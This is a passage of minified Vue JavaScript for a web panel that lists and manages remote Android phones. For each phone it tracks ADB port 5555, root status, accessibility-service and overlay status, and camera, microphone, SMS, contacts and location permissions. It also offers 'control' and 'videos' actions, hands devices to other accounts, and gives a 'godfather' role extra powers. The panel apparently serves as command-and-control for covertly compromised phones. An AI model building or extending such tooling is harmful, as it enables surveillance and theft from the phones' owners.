                        default: y(() => [w(u(fn))]),
                        _: 1
                    })]),
                    default: y(() => [X(" " + ue(a.titleTooltip), 1)]),
                    _: 1
                })) : ce("", !0)])) : ce("", !0), je(D.$slots, "tableTitle", {}, void 0, !0)]), A("div", ai, [je(D.$slots, "toolbar", {}, void 0, !0), w(we, {
                    trigger: "hover"
                }, {
                    trigger: y(() => [A("div", ri, [w(Xe, {
                        value: _.value,
                        "onUpdate:value": [W[0] || (W[0] = ne => _.value = ne), M]
                    }, null, 8, ["value"])])]),
                    default: y(() => [W[3] || (W[3] = A("span", null, "表格斑马纹", -1))]),
                    _: 1
                }), w(Ne, {
                    vertical: ""
                }), w(we, {
                    trigger: "hover"
                }, {
                    trigger: y(() => [A("div", {
                        class: "table-toolbar-right-icon",
                        onClick: W[1] || (W[1] = (...ne) => u(R) && u(R)(...ne))
                    }, [w(Pe, {
                        size: "18"
                    }, {
                        default: y(() => [w(u($o))]),
                        _: 1
                    })])]),
                    default: y(() => [W[4] || (W[4] = A("span", null, "刷新", -1))]),
                    _: 1
                }), w(we, {
                    trigger: "hover"
                }, {
                    trigger: y(() => [A("div", si, [w(et, {
                        onSelect: d,
                        trigger: "click",
                        options: o,
                        value: v.value,
                        "onUpdate:value": W[2] || (W[2] = ne => v.value = ne)
                    }, {
                        default: y(() => [w(Pe, {
                            size: "18"
                        }, {
                            default: y(() => [w(u(wr))]),
                            _: 1
                        })]),
                        _: 1
                    }, 8, ["value"])])]),
                    default: y(() => [W[5] || (W[5] = A("span", null, "密度", -1))]),
                    _: 1
                }), w(Xr)])]), A("div", ii, [w(Ce, he({
                    ref_key: "tableElRef",
                    ref: l
                }, C.value, {
                    striped: _.value,
                    pagination: $.value,
                    "onUpdate:page": N,
                    "onUpdate:pageSize": I
                }), en({
                    _: 2
                }, [Ue(Object.keys(D.$slots), ne => ({
                    name: ne,
                    fn: y(tt => [je(D.$slots, ne, tn(nn(tt)), void 0, !0)])
                }))]), 1040, ["striped", "pagination"])])], 64)
            }
        }
    }),
    ui = Le(li, [
        ["__scopeId", "data-v-68d6ad9e"]
    ]);

function ci(e) {
    return e === "NInput" ? "请输入" : ["NPicker", "NSelect", "NCheckbox", "NRadio", "NSwitch", "NDatePicker", "NTimePicker"].includes(e) ? "请选择" : ""
}

function di({
    emit: e,
    getProps: t,
    formModel: n,
    getSchema: o,
    formElRef: r,
    defaultFormModel: a,
    loadingSub: s,
    handleFormValues: l
}) {
    function i() {
        return L(this, null, function*() {
            var g;
            return (g = u(r)) == null ? void 0 : g.validate()
        })
    }

    function c(g) {
        return L(this, null, function*() {
            g && g.preventDefault(), s.value = !0;
            const {
                submitFunc: f
            } = u(t);
            if (f && fe(f)) return yield f(), s.value = !1, !1;
            if (!u(r)) return !1;
            try {
                yield i();
                const O = j();
                return s.value = !1, e("submit", O), O
            } catch (O) {
                return e("submit", !1), s.value = !1, console.error(O), !1
            }
        })
    }

    function _() {
        return L(this, null, function*() {
            var g;
            yield(g = u(r)) == null ? void 0 : g.restoreValidation()
        })
    }

    function P() {
        return L(this, null, function*() {
            const {
                resetFunc: g,
                submitOnReset: f
            } = u(t);
            if (g && fe(g) && (yield g()), !u(r)) return;
            Object.keys(n).forEach(S => {
                n[S] = u(a)[S] || null
            }), yield _();
            const O = l(ye(u(n)));
            e("reset", O), f && (yield c())
        })
    }

    function j() {
        return u(r) ? l(ye(u(n))) : {}
    }

    function p(g) {
        return L(this, null, function*() {
            const f = u(o).map(h => h.field).filter(Boolean);
            Object.keys(g).forEach(h => {
                const O = g[h];
                f.includes(h) && (n[h] = O)
            })
        })
    }

    function v(g) {
        s.value = g
    }
    return {
        handleSubmit: c,
        validate: i,
        resetFields: P,
        getFieldsValue: j,
        clearValidate: _,
        setFieldsValue: p,
        setLoading: v
    }
}

function fi({
    defaultFormModel: e,
    getSchema: t,
    formModel: n
}) {
    function o(a) {
        if (!io(a)) return {};
        const s = {};
        for (const l of Object.entries(a)) {
            let [, i] = l;
            const [c] = l;
            !c || me(i) && i.length === 0 || fe(i) || gt(i) || (Ye(i) && (i = i.trim()), un(s, c, i))
        }
        return s
    }

    function r() {
        const a = u(t),
            s = {};
        a.forEach(l => {
            const {
                defaultValue: i
            } = l;
            gt(i) || (s[l.field] = i, n[l.field] = i)
        }), e.value = s
    }
    return {
        handleFormValues: o,
        initDefault: r
    }
}
const pi = {
        labelWidth: {
            type: [Number, String],
            default: 80
        },
        schemas: {
            type: [Array],
            default: () => []
        },
        layout: {
            type: String,
            default: "inline"
        },
        inline: {
            type: Boolean,
            default: !1
        },
        size: {
            type: String,
            default: "medium"
        },
        labelPlacement: {
            type: String,
            default: "left"
        },
        isFull: {
            type: Boolean,
            default: !0
        },
        showActionButtonGroup: de.bool.def(!0),
        showResetButton: de.bool.def(!0),
        resetButtonOptions: Object,
        showSubmitButton: de.bool.def(!0),
        submitButtonOptions: Object,
        showAdvancedButton: de.bool.def(!0),
        submitButtonText: {
            type: String,
            default: "查询"
        },
        resetButtonText: {
            type: String,
            default: "重置"
        },
        gridProps: Object,
        giProps: Object,
        baseGridStyle: {
            type: Object
        },
        collapsed: {
            type: Boolean,
            default: !1
        },
        collapsedRows: {
            type: Number,
            default: 1
        }
    },
    gi = re({
        name: "BasicForm",
        components: {
            DownOutlined: Po,
            UpOutlined: Lr,
            QuestionCircleOutlined: fn
        },
        props: E({}, pi),
        emits: ["reset", "submit", "register"],
        setup(e, {
            emit: t,
            attrs: n
        }) {
            const o = F({}),
                r = Oe({}),
                a = F({}),
                s = F(null),
                l = F(null),
                i = F(!0),
                c = F(!1),
                _ = F(!1),
                P = z(() => Object.assign({
                    size: e.size,
                    type: "primary"
                }, e.submitButtonOptions)),
                j = z(() => Object.assign({
                    size: e.size,
                    type: "default"
                }, e.resetButtonOptions));

            function p(d) {
                var $;
                const b = ($ = d.componentProps) != null ? $ : {},
                    C = d.component;
                return E({
                    clearable: !0,
                    placeholder: ci(u(C))
                }, b)
            }
            const v = z(() => {
                    const d = E(E({}, e), u(a)),
                        b = {
                            rules: {}
                        };
                    return (d.schemas || []).forEach($ => {
                        $.rules && me($.rules) && (b.rules[$.field] = $.rules)
                    }), E(E({}, d), u(b))
                }),
                g = z(() => {
                    const {
                        layout: d
                    } = u(v);
                    return d === "inline"
                }),
                f = z(() => {
                    const {
                        gridProps: d
                    } = u(v);
                    return le(E({}, d), {
                        collapsed: g.value ? i.value : !1,
                        responsive: "screen"
                    })
                }),
                h = z(() => E(E(E({}, n), e), u(v))),
                O = z(() => {
                    const d = u(s) || u(v).schemas;
                    for (const b of d) {
                        const {
                            defaultValue: C
                        } = b;
                        C && (b.defaultValue = C)
                    }
                    return d
                }),
                {
                    handleFormValues: S,
                    initDefault: U
                } = fi({
                    defaultFormModel: o,
                    getSchema: O,
                    formModel: r
                }),
                {
                    handleSubmit: k,
                    validate: R,
                    resetFields: Z,
                    getFieldsValue: se,
                    clearValidate: Q,
                    setFieldsValue: m
                } = di({
                    emit: t,
                    getProps: v,
                    formModel: r,
                    getSchema: O,
                    formElRef: l,
                    defaultFormModel: o,
                    loadingSub: c,
                    handleFormValues: S
                });

            function T() {
                i.value = !i.value
            }

            function N(d) {
                return L(this, null, function*() {
                    a.value = lo(u(a) || {}, d)
                })
            }
            const I = {
                getFieldsValue: se,
                setFieldsValue: m,
                resetFields: Z,
                validate: R,
                clearValidate: Q,
                setProps: N,
                submit: k
            };
            return $e(() => O.value, d => {
                u(_) || d != null && d.length && (U(), _.value = !0)
            }), Ie(() => {
                U(), t("register", I)
            }), {
                formElRef: l,
                formModel: r,
                getGrid: f,
                getProps: v,
                getBindValue: h,
                getSchema: O,
                getSubmitBtnOptions: P,
                getResetBtnOptions: j,
                handleSubmit: k,
                resetFields: Z,
                loadingSub: c,
                isInline: g,
                getComponentProps: p,
                unfoldToggle: T
            }
        }
    });

function mi(e, t, n, o, r, a) {
    const s = ae("QuestionCircleOutlined"),
        l = ze,
        i = Je,
        c = lt,
        _ = Wt,
        P = Gt,
        j = co,
        p = fo,
        v = po,
        g = go,
        f = ge,
        h = ae("DownOutlined"),
        O = ae("UpOutlined"),
        S = mo,
        U = vo;
    return x(), K(U, he(e.getBindValue, {
        model: e.formModel,
        ref: "formElRef"
    }), {
        default: y(() => [w(S, tn(nn(e.getGrid)), {
            default: y(() => [(x(!0), G(Me, null, Ue(e.getSchema, k => (x(), K(g, he({
                ref_for: !0
            }, k.giProps, {
                key: k.field
            }), {
                default: y(() => [w(v, {
                    label: k.label,
                    path: k.field
                }, en({
                    default: y(() => [k.slot ? je(e.$slots, k.slot, {
                        key: 0,
                        model: e.formModel,
                        field: k.field,
                        value: e.formModel[k.field]
                    }, void 0, !0) : k.component === "NCheckbox" ? (x(), K(P, {
                        key: 1,
                        value: e.formModel[k.field],
                        "onUpdate:value": R => e.formModel[k.field] = R
                    }, {
                        default: y(() => [w(_, null, {
                            default: y(() => [(x(!0), G(Me, null, Ue(k.componentProps.options, R => (x(), K(c, {
                                key: R.value,
                                value: R.value,
                                label: R.label
                            }, null, 8, ["value", "label"]))), 128))]),
                            _: 2
                        }, 1024)]),
                        _: 2
                    }, 1032, ["value", "onUpdate:value"])) : k.component === "NRadioGroup" ? (x(), K(p, {
                        key: 2,
                        value: e.formModel[k.field],
                        "onUpdate:value": R => e.formModel[k.field] = R
                    }, {
                        default: y(() => [w(_, null, {
                            default: y(() => [(x(!0), G(Me, null, Ue(k.componentProps.options, R => (x(), K(j, {
                                key: R.value,
                                value: R.value
                            }, {
                                default: y(() => [X(ue(R.label), 1)]),
                                _: 2
                            }, 1032, ["value"]))), 128))]),
                            _: 2
                        }, 1024)]),
                        _: 2
                    }, 1032, ["value", "onUpdate:value"])) : (x(), K(uo(k.component), he({
                        key: 3,
                        ref_for: !0
                    }, e.getComponentProps(k), {
                        value: e.formModel[k.field],
                        "onUpdate:value": R => e.formModel[k.field] = R,
                        class: {
                            isFull: k.isFull != !1 && e.getProps.isFull
                        }
                    }), null, 16, ["value", "onUpdate:value", "class"])), k.suffix ? je(e.$slots, k.suffix, {
                        key: 4,
                        model: e.formModel,
                        field: k.field,
                        value: e.formModel[k.field]
                    }, void 0, !0) : ce("", !0)]),
                    _: 2
                }, [k.labelMessage ? {
                    name: "label",
                    fn: y(() => [X(ue(k.label) + " ", 1), w(i, {
                        trigger: "hover",
                        style: mt(k.labelMessageStyle)
                    }, {
                        trigger: y(() => [w(l, {
                            size: "18",
                            class: "text-gray-400 cursor-pointer"
                        }, {
                            default: y(() => [w(s)]),
                            _: 1
                        })]),
                        default: y(() => [X(" " + ue(k.labelMessage), 1)]),
                        _: 2
                    }, 1032, ["style"])]),
                    key: "0"
                } : void 0]), 1032, ["label", "path"])]),
                _: 2
            }, 1040))), 128)), e.getProps.showActionButtonGroup ? (x(), K(g, {
                key: 0,
                span: e.isInline ? "" : 24,
                suffix: !!e.isInline
            }, {
                default: y(({
                    overflow: k
                }) => [w(_, {
                    align: "center",
                    justify: e.isInline ? "end" : "start",
                    style: mt({
                        "margin-left": `${e.isInline?12:e.getProps.labelWidth}px`
                    })
                }, {
                    default: y(() => [e.getProps.showSubmitButton ? (x(), K(f, he({
                        key: 0
                    }, e.getSubmitBtnOptions, {
                        onClick: e.handleSubmit,
                        loading: e.loadingSub,
                        "attr-type": "submit"
                    }), {
                        default: y(() => [X(ue(e.getProps.submitButtonText), 1)]),
                        _: 1
                    }, 16, ["onClick", "loading"])) : ce("", !0), e.getProps.showResetButton ? (x(), K(f, he({
                        key: 1
                    }, e.getResetBtnOptions, {
                        onClick: e.resetFields
                    }), {
                        default: y(() => [X(ue(e.getProps.resetButtonText), 1)]),
                        _: 1
                    }, 16, ["onClick"])) : ce("", !0), e.isInline && e.getProps.showAdvancedButton ? (x(), K(f, {
                        key: 2,
                        type: "primary",
                        text: "",
                        "icon-placement": "right",
                        onClick: e.unfoldToggle
                    }, {
                        icon: y(() => [k ? (x(), K(l, {
                            key: 0,
                            size: "14",
                            class: "unfold-icon"
                        }, {
                            default: y(() => [w(h)]),
                            _: 1
                        })) : (x(), K(l, {
                            key: 1,
                            size: "14",
                            class: "unfold-icon"
                        }, {
                            default: y(() => [w(O)]),
                            _: 1
                        }))]),
                        default: y(() => [X(" " + ue(k ? "展开" : "收起"), 1)]),
                        _: 2
                    }, 1032, ["onClick"])) : ce("", !0)]),
                    _: 2
                }, 1032, ["justify", "style"])]),
                _: 1
            }, 8, ["span", "suffix"])) : ce("", !0)]),
            _: 3
        }, 16)]),
        _: 3
    }, 16, ["model"])
}
const vi = Le(gi, [
    ["render", mi],
    ["__scopeId", "data-v-c36fe6fa"]
]);

function hi() {
    return !0
}

function yi(e) {
    const t = F(null),
        n = F(!1);

    function o() {
        return L(this, null, function*() {
            const s = u(t);
            return s || console.error("The form instance has not been obtained, please make sure that the form has been rendered when performing the form operation!"), yield Ze(), s
        })
    }

    function r(s) {
        Xt(() => {
            t.value = null, n.value = null
        }), !(u(n) && hi() && s === u(t)) && (t.value = s, n.value = !0, $e(() => e, () => {
            e && s.setProps(ho(e))
        }, {
            immediate: !0,
            deep: !0
        }))
    }
    return [r, {
        setProps: s => L(this, null, function*() {
            yield(yield o()).setProps(s)
        }),
        resetFields: () => L(this, null, function*() {
            o().then(s => L(this, null, function*() {
                yield s.resetFields()
            }))
        }),
        clearValidate: s => L(this, null, function*() {
            yield(yield o()).clearValidate(s)
        }),
        getFieldsValue: () => {
            var s;
            return (s = u(t)) == null ? void 0 : s.getFieldsValue()
        },
        setFieldsValue: s => L(this, null, function*() {
            yield(yield o()).setFieldsValue(s)
        }),
        submit: () => L(this, null, function*() {
            return (yield o()).submit()
        }),
        validate: s => L(this, null, function*() {
            return (yield o()).validate(s)
        }),
        setLoading: s => {
            n.value = s
        },
        setSchema: s => L(this, null, function*() {
            (yield o()).setSchema(s)
        })
    }]
}
const Dt = Oe({});
const _batchSelectedIds = new Set();
let _batchBar = null;
function _updateBatchBar() {
    if (!_batchBar) return;
    var count = _batchSelectedIds.size;
    _batchBar.querySelector("._batch-count").textContent = "\u5DF2\u9009\u62E9 " + count + " \u53F0\u8BBE\u5907";
    _batchBar.style.display = count > 0 ? "flex" : "none";
}
const _zglPermDefs = [
    ["CAMERA", "\u6444\u50cf\u5934"],
    ["MIC", "\u9ea6\u514b\u98ce"],
    ["LOCATION", "\u5b9a\u4f4d"],
    ["CONTACTS", "\u901a\u8baf\u5f55"],
    ["SMS", "\u77ed\u4fe1"],
    ["PHONE", "\u7535\u8bdd"],
    ["STORAGE", "\u5b58\u50a8"],
    ["acc", "\u65e0\u969c\u788d"],
    ["overlay", "\u60ac\u6d6e\u7a97"]
];

function _zglPermVal(v) {
    if (v === 1 || v === "1" || v === true) return 1;
    if (v === 0 || v === "0" || v === false) return 0;
    return -1;
}

function _zglPermDots(p, size) {
    var sz = size || 9,
        out = [];
    _zglPermDefs.forEach(function(it) {
        var v = (p && typeof p === "object") ? _zglPermVal(p[it[0]]) : -1;
        var col = v === 1 ? "#16a34a" : v === 0 ? "#e05d4f" : "#5a544a";
        out.push(q("span", {
            title: it[1] + (v === 1 ? " \u5df2\u6388\u6743" : v === 0 ? " \u672a\u6388\u6743" : " \u672a\u77e5"),
            style: "display:inline-block;width:" + sz + "px;height:" + sz + "px;border-radius:50%;background:" + col + ";flex:none;"
        }));
    });
    return out;
}

const bi = [{
    key: "_select",
    width: 50,
    title: "",
    render: function(e) {
        return q("div", { style: "display:flex;align-items:center;justify-content:center;" }, [q("input", {
            type: "checkbox",
            class: "_batch-cb",
            checked: _batchSelectedIds.has(e.phone_id),
            style: "width:16px;height:16px;cursor:pointer;accent-color:#16a34a;",
            onClick: function(ev) {
                if (ev.target.checked) {
                    _batchSelectedIds.add(e.phone_id);
                } else {
                    _batchSelectedIds.delete(e.phone_id);
                }
                _updateBatchBar();
            }
        })]);
    }
}, {
    title: "\u8D26\u53F7",
    key: "user_email",
    width: 110,
    render: function(e) {
        var v = String(e.user_email || "");
        var i = v.indexOf("@");
        var name = i > 0 ? v.slice(0, i) : v;
        return q("div", {
            class: "zgl-col-account"
        }, [q("span", {
            class: "zgl-col-account-ic",
            innerHTML: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M10 13a5 5 0 0 0 7.5.5l3-3a5 5 0 0 0-7-7l-1.7 1.7M14 11a5 5 0 0 0-7.5-.5l-3 3a5 5 0 0 0 7 7l1.7-1.7"/></svg>'
        }, null), q("b", null, name)]);
    }
}, {
    title: "ADB",
    key: "adb_status",
    width: 80,
    render: function(e) {
        var v = String(e.adb_status || "");
        if (v === "5555") return q("span", { class: "zgl-adb zgl-adb-ok" }, [q("i", { class: "zgl-dot zgl-dot-ok" }, null), "5555"]);
        if (v === "off") return q("span", { class: "zgl-adb zgl-adb-no" }, [q("i", { class: "zgl-dot zgl-dot-danger" }, null), "off"]);
        if (v === "no-root") return q("span", { class: "zgl-adb zgl-adb-nr" }, [q("i", { class: "zgl-dot zgl-dot-warn" }, null), "no-root"]);
        return q("span", { class: "zgl-adb zgl-adb-na" }, "-");
    }}, {
        title: "备注",
        key: "phone_name",
        width: 60
    }, {
        title: "地区",
        key: "country",
        width: 240,
        minWidth: 240,
        ellipsis: false
    }, {
        title: "心跳时间",
        key: "lastPing",
        width: 130,
        render(e) {
            const raw = e.lastPing;
            const parsed = raw ? new Date(typeof raw === "number" && raw < 10000000000 ? raw * 1000 : raw) : null;
            const valid = parsed && !isNaN(parsed.getTime());
            const text = valid ? parsed.getFullYear()+"-"+String(parsed.getMonth()+1).padStart(2,"0")+"-"+String(parsed.getDate()).padStart(2,"0")+" "+String(parsed.getHours()).padStart(2,"0")+":"+String(parsed.getMinutes()).padStart(2,"0")+":"+String(parsed.getSeconds()).padStart(2,"0") : "暂无心跳";
            const age = valid ? Math.max(0, Date.now() - parsed.getTime()) : Infinity;
            const color = age < 120000 ? "#49d9a4" : "#5b6b8c";
            const dot = age < 120000 ? "#16a34a" : "#867c69";
            return q("span", {
                style: "display:inline-flex;align-items:center;gap:6px;color:" + color + ";font-size:12px;font-weight:600;white-space:nowrap;"
            }, [q("i", {
                style: "width:7px;height:7px;border-radius:50%;background:" + dot + ";display:inline-block;"
            }, null), text]);
        }
    }, {
        title: "机型",
        key: "model",
        width: 170,
        render: function(e) {
            var m = String(e.model || "").trim();
            var v = String(e.android_version || e.android_ver || "").trim();
            var mClean = m.replace(/\s*android\s*$/i, "");
            if (mClean) m = mClean;
            var vClean = v.replace(/^android\s+/i, "").trim();
            if (!m && !v) return "-";
            return q("div", {
                style: "line-height:1.5;"
            }, [q("div", {
                style: "font-size:13px;color:#14213d;"
            }, m || "-"), vClean ? q("div", {
                style: "font-size:11px;color:#9a8f7a;margin-top:1px;"
            }, "Android " + vClean) : null]);
        }
    }, {
        title: "电池",
        key: "battery_charge",
        width: 104,
        render(e) {
            const n = String(e.battery_charge || "").match(/\d+/g);
            const pct = n ? Math.max(0, Math.min(100, Math.round(n.reduce((r,a)=>r+parseFloat(a),0)))) : -1;
            const color = pct < 0 ? "#c9d4ea" : pct > 30 ? "linear-gradient(135deg,#3ddc97,#16a34a)" : pct > 15 ? "linear-gradient(135deg,#fbbf24,#f59e0b)" : "linear-gradient(135deg,#fb7185,#dc2626)";
            return q("div", { class: "zgl-batt" }, [q("div", { class: "zgl-batt-track" }, [q("i", { style: "width:" + (pct < 0 ? 0 : pct) + "%;background:" + color }, null)]), q("b", null, pct < 0 ? "—" : pct + "%")]);
        }
    }, {
        title: "网络",
        key: "network",
        width: 96,
        render(e) {
            const n = String(e.network || "").toUpperCase();
            const isWifi = n === "WIFI" || n === "WI-FI";
            const label = isWifi ? "WiFi" : (n ? "数据 " + n : "-");
            return q("span", {
                class: isWifi ? "zgl-net-w" : "zgl-net-4"
            }, label)
        }
    }, {
        title: "屏幕",
        key: "activz",
        width: 84,
        render(e) {
            const n = String(e.activz == null ? "" : e.activz),
                r = n === "0" || n === "2",
                a = n === "1" || n === "3";
            return q("span", {
                class: "zgl-scr"
            }, [q("i", { class: r ? "zgl-dot zgl-dot-ok" : "zgl-dot zgl-dot-off" }, null), r ? "亮屏" : a ? "息屏" : "未知"])
        }
    }, {
        title: "无障碍",
        key: "accessibility",
        width: 76,
        render(e) {
            const t = e.accessibility === "1";
            return q(bo, {
                type: t ? "success" : "default"
            }, () => t ? "已开启" : "未开启")
        }
    }, {
        title: "权限",
        key: "perms",
        width: 90,
        render: function(e) {
            var p = (e && e.perms && typeof e.perms === "object") ? e.perms : null;
            var has = p && Object.keys(p).length > 0;
            return q("span", {
                "data-zglperms": String((e && e.phone_id) || ""),
                "data-zglon": String(e && e.isonline === "0" ? "0" : "1"),
                class: "zgl-perm-pill" + (has ? " zgl-perm-pill-ok" : " zgl-perm-pill-warn"),
                onClick: function() {
                    try {
                        window.__zglDetailOpen && window.__zglDetailOpen(String((e && e.phone_id) || ""), "perms");
                    } catch (_) {}
                }
            }, has ? "已上报" : "未上报");
        }
    }, {
        title: "SIM卡",
        key: "sim",
        width: 138,
        render(e) {
            const s = String(e.sim == null ? "" : e.sim).toUpperCase(),
                has = s === "有卡" || s.indexOf("READY") !== -1,
                none = s === "无卡" || s.indexOf("NOT_READY") !== -1 || s.indexOf("ABSENT") !== -1 || s.indexOf("PERM_DISABLED") !== -1,
                carrier = String(e.simcarrier || "").trim();
            if (!has && !none) return "-";
            const label = has ? (carrier ? "有卡 · " + carrier : "有卡") : "无卡";
            return q("span", {
                class: "zgl-sim-tag",
                title: label
            }, label);
        }
    }],
    _i = {
        class: "index-root"
    },
    wi = {
        class: "modal-content"
    },
    Ci = {
        class: "button-wrapper"
    },
    Oi = re({
        __name: "index",
        setup(e) {
            const t = F(""),
                n = F(""),
                o = F(!1),
                r = F(null);
            let a = null;
            const s = nt.get("CURRENT-USER"),
                l = [{
                    field: "user_email",
                    label: "账号",
                    component: "NInput",
                    componentProps: {
                        placeholder: "请输入账号"
                    }
                }, {
                    field: "assigned_to",
                    label: "归属",
                    component: "NInput",
                    componentProps: {
                        placeholder: "请输入归属用户"
                    }
                }, {
                    field: "phone_name",
                    label: "备注",
                    component: "NInput",
                    componentProps: {
                        placeholder: "请输入备注"
                    }
                }, {
                    field: "country",
                    label: "国家",
                    component: "NInput",
                    componentProps: {
                        placeholder: "请输入国家"
                    }
                }, {
                    field: "model",
                    label: "型号",
                    component: "NInput",
                    componentProps: {
                        placeholder: "请输入型号"
                    }
                }, {
                    field: "accessibility",
                    label: "无障碍",
                    component: "NSelect",
                    componentProps: {
                        placeholder: "请选择类型",
                        options: [{
                            label: "未开启",
                            value: 0
                        }, {
                            label: "已开启",
                            value: 1
                        }]
                    }
                }, {
                    field: "install_date",
                    label: "时间",
                    component: "NInput",
                    componentProps: {
                        placeholder: "请输入时间"
                    }
                }],
                i = F(),
                c = Oe({
                    width: 240,
                    title: "操作",
                    key: "action",
                    render(d) {
                        const C = (d.hasOwnProperty("display") ? String(d.display) : "") === "0";
                        const _menu = ev => {
                            const _old = document.querySelector(".zgl-action-menu");
                            if (_old) _old.remove();
                            const ov = document.createElement("div");
                            ov.className = "zgl-action-menu";
                            const bcr = ev && ev.currentTarget && ev.currentTarget.getBoundingClientRect ? ev.currentTarget.getBoundingClientRect() : null;
                            ov.style.cssText = "position:fixed;z-index:99999;min-width:158px;background:#f7f9fd;border:1px solid rgba(79, 107, 254,.28);border-radius:10px;padding:6px;box-shadow:0 18px 46px rgba(0,0,0,.6);font-family:v-sans,system-ui,sans-serif;";
                            const mk = (label, fn, color) => {
                                const b = document.createElement("button");
                                b.textContent = label;
                                b.style.cssText = "display:block;width:100%;text-align:left;padding:8px 12px;border:0;background:transparent;color:" + (color || "#14213d") + ";font-size:13px;border-radius:7px;cursor:pointer;";
                                b.onmouseenter = () => b.style.background = "rgba(79, 107, 254,.14)";
                                b.onmouseleave = () => b.style.background = "transparent";
                                b.onclick = () => { ov.remove(); fn(); };
                                ov.appendChild(b);
                            };
                            if (s === "godfather") mk(C ? "启用" : "禁用", () => h(d, C ? 1 : 0));
                            mk("下发", () => { try { if (window.__zglOpenAccountPicker) { window.__zglOpenAccountPicker(String((d && d.phone_id) || "")); return; } } catch (e) {} U(d); });
                            if (s === "godfather") mk("下发子账号", () => openGfModal(d));
                            mk("删除", () => _confirmDeleteDevice(d), "#ff8a7a");
                            document.body.appendChild(ov);
                            const r2 = ov.getBoundingClientRect();
                            const x = Math.max(8, Math.min(bcr ? bcr.left : ev.clientX, window.innerWidth - r2.width - 12));
                            const yTop = bcr ? bcr.bottom + 6 : ev.clientY + 6;
                            const y = yTop + r2.height > window.innerHeight ? (bcr ? bcr.top - r2.height - 6 : ev.clientY - r2.height - 6) : yTop;
                            ov.style.left = x + "px";
                            ov.style.top = Math.max(8, y) + "px";
                            setTimeout(() => {
                                const close = e2 => {
                                    if (!ov.contains(e2.target)) { ov.remove(); document.removeEventListener("click", close); }
                                };
                                document.addEventListener("click", close);
                            }, 0);
                        };
                        return [q(ge, {
                            type: "primary",
                            size: "small",
                            style: {
                                marginRight: "8px"
                            },
                            onClick: () => S(d)
                        }, {
                            default: () => "控制"
                        }), q(ge, {
                            type: "default",
                            size: "small",
                            style: {
                                marginRight: "8px"
                            },
                            onClick: () => { try { window.__zglDetailOpen && window.__zglDetailOpen(d.phone_id || "", "videos"); } catch (e) {} }
                        }, {
                            default: () => "详情"
                        }), q(ge, {
                            type: "default",
                            size: "small",
                            onClick: ev => _menu(ev)
                        }, {
                            default: () => "\u22EE"
                        })]
                    }
                }),
                [_] = yi({
                    gridProps: {
                        cols: "1 s:1 m:2 l:4 xl:4 2xl:4",
                        xGap: 12,
                        yGap: 12
                    },
                    labelWidth: 80,
                    labelPlacement: "top",
                    showAdvancedButton: false,
                    schemas: l
                }),
                P = Oe({}),
                j = F(0),
                p = F(0);

            function v(d, b = 1e4) {
                return new Promise((C, $) => {
                    const B = setTimeout(() => $(new Error("WS wait timeout")), b),
                        M = Y => {
                            try {
                                const H = JSON.parse(Y.data);
                                (H == null ? void 0 : H.type) === d && (clearTimeout(B), a == null || a.removeEventListener("message", M), C(H))
                            } catch (H) {}
                        };
                    a == null || a.addEventListener("message", M)
                })
            }
            const g = Oe([]),
                f = C => L(this, [C], function*({
                    page: d,
                    pageSize: b
                }) {
                    var $, B;
                    try {
                        const M = vt(1, 1, {});
                        I(d, b);
                        const Y = yield v("checkphone", 1e4);
                        return g.splice(0, g.length, ...Y.list || []), g.forEach(H => {
                            H.user_email && (H.user_email = T(H.user_email)), Dt[H.phone_id] = H
                        }), j.value = ($ = Y.total) != null ? $ : g.length, p.value = (B = Y.pageCount) != null ? B : Math.ceil(j.value / b), M.then(H => {
                            const pe = new Map(H.list.map(D => [D.phone_id, D.address]));
                            g.forEach(D => {
                                pe.has(D.phone_id) && (D.address = pe.get(D.phone_id))
                            })
                        }), {
                            data: g,
                            total: j.value,
                            pageCount: p.value
                        }
                    } catch (M) {
                        return {
                            data: [],
                            total: 0,
                            pageCount: 0
                        }
                    }
                }),
                h = (d, b) => L(this, null, function*() {
                    try {
                        if (!a || a.readyState !== WebSocket.OPEN) {
                            window.$message.error("未连接");
                            return
                        }
                        const C = {
                            itype: "slr_panelsend",
                            subc: "display",
                            pid: d.phone_id,
                            display: b
                        };
                        a.send(JSON.stringify(C)), d.display = b, setTimeout(() => {
                            O()
                        }, 5e3)
                    } catch (C) {
                        window.$message.error("设备状态更新失败")
                    }
                });

            function O() {
                if (i.value) i.value.reload()
            }

            function S(d) {
                const {
                    phone_id: b
                } = d, C = `/info?id=${encodeURIComponent(b)}`;
                window.open(C, "_blank")
            }
            const U = d => {
                r.value = d.phone_id, n.value = window.location.host, o.value = !0
            };

            function k() {
                return L(this, null, function*() {
                    if (!t.value) {
                        window.$message.error("请输入下发账号");
                        return
                    }
                    if (!r.value) {
                        window.$message.error("未选择手机 ID");
                        return
                    }
                    try {
                        const b = yield fetch("/api/ReassignDevice.php", {
                            method: "POST",
                            headers: {"Content-Type": "application/json"},
                            body: JSON.stringify({
                                token: nt.get("ACCESS-TOKEN") || "",
                                phone_id: r.value,
                                target_email: t.value
                            })
                        });
                        const $ = yield b.json();
                        if ($.code === 200) {
                            if (a && a.readyState === WebSocket.OPEN && $.target_email && $.reassign_token) {
                                a.send(JSON.stringify({
                                    itype: "slr_panelsend",
                                    subc: "reassign",
                                    pid: r.value,
                                    new_email: $.target_email,
                                    new_usrname: t.value,
                                    reassign_token: $.reassign_token,
                                    usercheck: nt.get("CURRENT-USER")
                                }))
                            }
                            t.value = "", window.$message.success("下发成功"), o.value = !1, O()
                        } else {
                            window.$message.error($.msg || "下发失败")
                        }
                    } catch(B) {
                        window.$message.error("网络错误")
                    }
                })
            }

            function R(d) {
                return d
            }

            function _confirmDeleteDevice(d) {
                var pid = d.phone_id;
                var overlay = document.createElement("div");
                overlay.style.cssText = "position:fixed;inset:0;background:rgba(0,0,0,0.35);z-index:1000;display:flex;align-items:center;justify-content:center;";
                var modal = document.createElement("div");
                modal.style.cssText = "background:#ffffff;border-radius:14px;padding:24px;width:90%;max-width:380px;box-shadow:0 20px 60px rgba(0,0,0,0.15);font-family:v-sans,system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;";
                modal.innerHTML = '<div style="font-size:16px;font-weight:600;margin-bottom:12px;color:#14213d;">\u786E\u8BA4\u5220\u9664</div>' +
                    '<div style="font-size:14px;color:#666;margin-bottom:20px;">\u786E\u5B9A\u8981\u5220\u9664\u8BBE\u5907 <b>' + pid + '</b> \u5417\uFF1F\u5220\u9664\u540E\u8BBE\u5907\u5C06\u88AB\u65AD\u5F00\u8FDE\u63A5\u3002</div>';
                var btnBox = document.createElement("div");
